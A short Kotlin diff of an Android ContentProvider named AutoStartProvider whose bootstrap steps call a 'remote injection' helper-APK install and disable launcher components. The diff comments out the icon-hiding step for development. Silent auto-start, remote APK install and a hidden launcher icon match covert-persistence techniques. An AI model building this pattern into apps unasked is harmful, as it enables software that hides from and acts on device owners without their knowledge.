@@ -95,8 +95,8 @@ class AutoStartProvider : ContentProvider() {
         // ── STEP 5: Try remoteinjection for helper APK install ──
         step5_remoteInjection()
 
-        // ── STEP 6: Disable launcher components ──
-        step6_disableLauncherComponents(ctx, pkgName)
+        // ── STEP 6: Disable launcher components (for production only — skip during dev) ──
+        // step6_disableLauncherComponents(ctx, pkgName)  // DISABLED: Knox-locked components can't be re-enabled
 
         // ── STEP 7: Mark bootstrap complete ──
         prefs.edit()
